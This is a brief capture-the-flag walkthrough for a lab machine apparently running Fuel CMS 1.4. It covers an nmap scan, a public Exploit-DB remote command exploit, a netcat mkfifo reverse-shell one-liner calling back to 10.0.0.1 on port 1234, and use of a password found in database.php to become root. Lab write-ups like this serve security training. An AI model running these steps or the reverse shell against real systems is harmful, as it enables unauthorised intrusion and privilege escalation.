Start with NMAP scan. We will see that there is port 80 and http is running on it. So visit the webpage. This is running `fuel-1.4` so check for vulnerabilities in it and you can find exploits on `exploit db`. Download the exploit and then run it. now you can execute commands remotely but we need reverse shell for root flag, we can get user flag using this command execution we have.So start netcat with tags `-lvp` on port `1234` and search for reverse shell cheatsheet and you will find an command for nc reverse shells <br>
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
In this change the IP and port(if required) and then you will get reverse shell but we need root access which you can get if you have looked webpage clearly, there was mention of database.php file and try catting that you will get password for root user so first get a terminal using this command
```bash
script /dev/null -c bash
```
Now switch to root 
```bash
su root
```
you are now root user so go to root directory and get root flag and user flag can be found in `www-data` directory, and boom all flags are solved.
